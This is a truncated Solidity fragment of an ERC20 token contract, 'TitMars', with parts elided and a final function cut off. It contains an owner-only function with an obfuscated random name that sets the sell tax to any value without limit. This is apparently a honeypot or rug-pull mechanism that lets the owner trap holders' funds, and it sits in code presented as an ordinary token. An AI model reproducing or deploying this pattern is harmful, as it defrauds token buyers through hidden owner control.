...
contract TitMars is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DTM", "TitMars") {
        _mint(msg.sender, 68000000000);
        sellTax = 20;
        _owner = msg.sender;
    ...
    function add_o41ZCt(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_UxrYmj() public {
